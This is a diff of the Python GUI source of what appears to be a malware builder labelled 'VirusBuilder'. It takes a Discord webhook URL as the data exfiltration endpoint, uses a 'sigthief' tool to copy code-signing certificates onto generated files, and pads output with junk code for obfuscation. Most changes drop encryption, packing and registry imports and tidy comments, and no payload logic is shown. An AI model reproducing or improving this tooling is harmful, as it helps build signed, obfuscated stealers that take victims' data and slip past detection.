@@ -1,11 +1,8 @@
-import base64
 import copy
 import customtkinter as ctk
 import logging
 import logging.handlers
 import os
-import pyaes
-import py_compile
 import random
 import re
 import requests
@@ -13,17 +10,10 @@ import shutil
 import string
 import subprocess
 import sys
-import threading
 import time
-import winreg
-import zipfile
 import zlib
 from PIL import Image
-from tkinter import filedialog, messagebox
-from tools import upx
 from tools.sigthief import signfile, outputCert
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
 class App(ctk.CTk):
     def __init__(self):
@@ -95,8 +85,6 @@ class App(ctk.CTk):
 
         self.builder_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
         self.builder_frame.grid_columnconfigure(0, weight=1)
-
-        # Frame 1
 
         self.webhook_button = ctk.CTkEntry(self.builder_frame, width=570, height=35, font=ctk.CTkFont(
             size=15, family=self.font), placeholder_text="https://discord(app).com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
@@ -512,8 +500,7 @@ class %s:
                 file.write(code + "\n" + junk_code)
         
         try:
-            # Update the path to save the file in the 1-Output/VirusBuilder/ directory
-            output_directory = os.path.join(self.basefilepath, "1-Output", "VirusBuilder")
+            output_directory = os.path.join(f'1-Output/VirusBuilder')
             if not os.path.exists(output_directory):
                 os.makedirs(output_directory)
 
@@ -554,7 +541,7 @@ class %s:
         self.write_and_obfuscate(filename)    
         
         try:
-            if self.get_filetype() == "py":  # Correction: condition dans le bloc `try`
+            if self.get_filetype() == "py":
                 pass
 
         except Exception as e:
@@ -661,3 +648,4 @@ class %s:
 
 if __name__ == "__main__":
     App().mainloop()
+    
